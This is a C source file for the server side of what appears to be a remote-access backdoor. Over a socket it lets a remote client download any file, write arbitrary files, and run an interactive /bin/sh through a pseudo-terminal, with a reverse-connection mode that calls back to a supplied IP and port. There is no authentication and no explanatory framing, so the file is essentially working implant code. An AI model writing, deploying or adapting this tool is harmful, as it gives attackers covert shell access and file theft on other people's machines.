#include <unistd.h>
#include <stdio.h>
#include <sys/select.h>
#include <fcntl.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <pty.h>
#include "remote_control.h"
#include "connection.h"

extern int mode_of_sys;
extern int mode_of_work;
extern unsigned int host;
extern unsigned short port;
extern int client;
char message[BUFSIZE + 5];

bool get_file(){
	char file_path[BUFSIZE + 5] = {0};
	char message[BUFSIZE + 5] = {0};
	int file_path_len;
	int fd;
	int i, sum = 0;
	struct stat s_buf;
	recv_msg(file_path, &file_path_len);
	file_path[file_path_len] = '\0';
	stat(file_path, &s_buf);
	if(!S_ISREG(s_buf.st_mode)) return false;
	//printf("%s\n", file_path);
	//can't find the specify file case
	if((fd = open(file_path, O_RDONLY)) < 0) return false;
	while(1){
		i = read(fd, message, BUFSIZE);
		//printf("%d\n", i);
		if(i <= 0) return false;
		send_msg(message, i);
		sum += i;
	}
	close(fd);
	return true;
}

bool put_file(){
	int fd;
	int i, sum = 0;
	int file_path_len;
	int flag;
	char file_path[BUFSIZE + 5] = {0};
	recv_msg(file_path, &file_path_len);
	file_path[file_path_len] = '\0';
	//printf("%s\n", file_path);
	if((fd = creat(file_path, 0644)) < 0){
		printf("%d\n", fd);	
		return false; //to be perfected
	}
	while(1){	//to be perfected
		flag = recv_msg(message, &i);	//to be perfected
		//printf("%d\n", i);
		if(flag == false || i <= 0) return false;
		if(write(fd, message, i) != i) return false; //exception handling;
		sum += i;
	}
	close(fd);
	return true;
}

bool run_shell(){
	fd_set rd;
	int len;
	int pty, tty, pid;
	int tmp;
	char message[BUFSIZE + 5] = {0};
	if(openpty(&pty, &tty, NULL, NULL, NULL ) < 0)
		return false;
	if(recv_msg(message, &len) == false) return false;
	message[len] = '\0';
	printf("%s\n", message);
	if((pid = fork()) < 0) return false;
	if(pid){
		close(tty);
		while(1){
			FD_ZERO(&rd);
			FD_SET(client, &rd);
			FD_SET(pty, &rd);
			tmp = (pty >= client ? pty : client);
			if(select(tmp + 1, &rd, NULL, NULL, NULL) < 0)
				return false;
			if(FD_ISSET(client, &rd)){
				if(recv_msg(message, &len) == false) return false;
				//message[len] = '\0';
				//printf(">%s\n", message);
				write(pty, message, len);
			}
			if(FD_ISSET(pty, &rd)){
				if((len = read(pty, message, BUFSIZE)) <= 0) return false;
				//printf("%d\n", len);
				send_msg(message, len);
			}
		}
	}
	else{
		close( client );
		close( pty );
		if(setsid() < 0) return false;
		if( ioctl( tty, TIOCSCTTY, NULL ) < 0) return false;
		dup2( tty, 0 );
		dup2( tty, 1 );
		dup2( tty, 2 );
		if( tty > 2 ) close( tty );
		execl("/bin/sh", "sh", "-c", message, (char *)0);
		exit(0);
	}
	return true;
}

void service(){
	char command_msg;
	int msg_len, flag;
	while(1){
		recv_msg(&command_msg, &msg_len);
		//printf("%d\n", command_msg);
		switch(command_msg){
			case GET_FILE:flag = get_file();break;
			case PUT_FILE:flag = put_file();break;
			case RUN_SHELL:flag = run_shell();break;
			default:;
		}
		if(flag == false) break;
		reset_connection();
		//printf("reset\n");
	}
	close_connection();
}

void usage(){
	printf("\t-f\tforward connection,default mode.\n");
	printf("\t-r\treverse connection.\n");
	printf("\t-i\tip address.\n");
	printf("\t-p\tport.\n");
	printf("\t-h\tprint help message.");
	exit(0);
}

int main(int argc, char *argv[]){
    int ch;
    mode_of_sys = SERVER;
    while((ch = getopt(argc, argv, "frhi:p:")) != -1){
		switch(ch){
		    case 'f':
				mode_of_work = FORWARDCON;
				break;
			case 'r':
				mode_of_work = REVERSECON;
				break;
			case 'i':
				host = inet_addr(optarg);
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'h':
				usage();
				break;
			default:
				printf("Existence of unidentified parameters\n");
		}
	}
	if(init_connection() == FAILURE){
		printf("connect failure\n");
	}
    else{
        service();
    }
	return 0;
}
